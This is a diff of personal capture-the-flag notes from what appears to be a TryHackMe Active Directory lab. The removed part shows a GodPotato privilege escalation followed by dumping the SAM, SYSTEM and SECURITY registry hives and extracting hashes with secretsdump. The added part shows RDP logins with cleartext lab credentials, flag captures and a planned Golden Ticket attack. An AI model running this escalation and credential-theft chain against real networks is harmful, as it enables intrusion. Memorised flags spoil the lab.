@@ -1025,8 +1025,8 @@ sudo apt install keepass2
 keepass2 pass.kdbx
 
 Server 2 Admin:
-	Username: adm
-	Password: 8XX8N5VBFprFfmFSdQ4soUM4  
+	//Username: adm
+	//Password: 8XX8N5VBFprFfmFSdQ4soUM4  
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -1041,54 +1041,25 @@ xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /u:adm /p:'8XX8N5VBFprFfm
 cat C:\Users\Administrator\root.txt
 //THM{496fde67-1d0d-4776-833d-b6371f290eac}
 
+//Now that we got all the flags for this box, lets switch back to a domain account.
 
-// WinPeas x2
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-cp /usr/share/peass/winpeas/winPEASx64_ofs.exe .
+//Switch back to a domain Account
+xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
-//Run in admin powershell
-cd \\tsclient\Public
+net group "Domain Admins" /domain
+-------------------------------------------------------------------------------
+Administrator            bob                      qw0.hannah.hardy
+qw1.brian.singh
+The command completed successfully.
 
-.\winPEASx64_ofs.exe -lolbas log=winPeas2.out
+//qw1.brian.singh is a domain admin
 
-//NOTE:To follow on kali use: tail -f winPeas.out
+//From Server2 lets RDP to the Domain Controller(10.200.171.122).
+//We can't do it from our attack box (filtered).
 
-//Loot
-HighIntegrity: True
-SeImpersonatePrivilege: ENABLED
+//I created a DC-Connect RDP file on the desktop of Server2 for quick access
 
-//SeImpersonatePrivilege gives way to potatoes
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-// GodPotato
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe
-
-copy \\tsclient\Public\GodPotato.exe C:\Windows\Temp\gp.exe
-
-ls C:\Windows\Temp\gp.exe
-
-//Test
-C:\Windows\Temp\gp.exe -cmd "whoami"
-
-nt authority\system
-
-mkdir winReg
-
-//Dump SAM/SYSTEM/SECURITY hives as SYSTEM:
-C:\Windows\Temp\gp.exe -cmd "reg save HKLM\SAM \\tsclient\Public\winReg\SAM"
-C:\Windows\Temp\gp.exe -cmd "reg save HKLM\SYSTEM \\tsclient\Public\winReg\SYSTEM"
-C:\Windows\Temp\gp.exe -cmd "reg save HKLM\SECURITY \\tsclient\Public\winReg\SECURITY"
-
-//Extract all hashes
-impacket-secretsdump -sam ./winReg/SAM -system ./winReg/SYSTEM -security ./winReg/SECURITY LOCAL
-
-
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
+//SUCCESS!! Connection
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -1096,21 +1067,29 @@ impacket-secretsdump -sam ./winReg/SAM -system ./winReg/SYSTEM -security ./winRe
 
 
 |================================================================
-- Name: dc1
+- Name: DC1
 - IP Address: 10.200.171.122
-- OS: 
-- Notes: 
+- OS: Microsoft Windows Server 2019 Datacenter
+		10.0.17763 N/A Build 17763 
 
 //CREDS:
-	
+
 //Flags:
-#User:
-#System:
+#User:		THM{1dac8c6b-908e-4100-9deb-f53e68df840d}
+#System:	THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Find Flags
+cat C:\user.txt
+//THM{1dac8c6b-908e-4100-9deb-f53e68df840d}
+
+cat C:\Users\Administrator\root.txt
+//THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}
 
 
+// Golden Ticket – AI.VANCHAT.LOC
+# After compromising the child domain, I want to try and forge a Golden Ticket to escalate privileges across the trust boundary. 
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -1167,10 +1146,12 @@ sudo ip route add 10.200.171.101/32 dev ligolo
 sudo ip route add 10.200.171.122/32 dev ligolo
 sudo ip route add 10.200.171.102/32 dev ligolo
 
-
+//Domain Admin
 xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
 xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /u:adm /p:'8XX8N5VBFprFfmFSdQ4soUM4' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+
+//RDP from Server2(10.200.171.102)
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
